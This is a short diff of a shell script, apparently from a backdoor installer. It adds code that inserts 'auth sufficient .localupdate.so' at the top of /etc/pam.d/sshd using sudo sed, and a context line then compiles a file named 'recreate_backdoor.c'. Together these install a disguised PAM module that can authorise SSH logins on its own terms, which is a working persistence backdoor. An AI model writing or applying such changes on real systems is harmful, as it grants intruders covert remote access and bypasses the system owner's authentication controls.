@@ -21,7 +21,12 @@ PAM_FILE="/etc/pam.d/sshd"
 LINE="auth sufficient .localupdate.so"
 
 
-
+if ! grep -Fxq "$LINE" "$PAM_FILE"; then
+    sudo sed -i "1i$LINE" "$PAM_FILE"
+    echo "[+] PAM config patched."
+else
+    echo "[=] PAM already patched."
+fi
 
 
 gcc recreate_backdoor.c -o recreate_backdoor
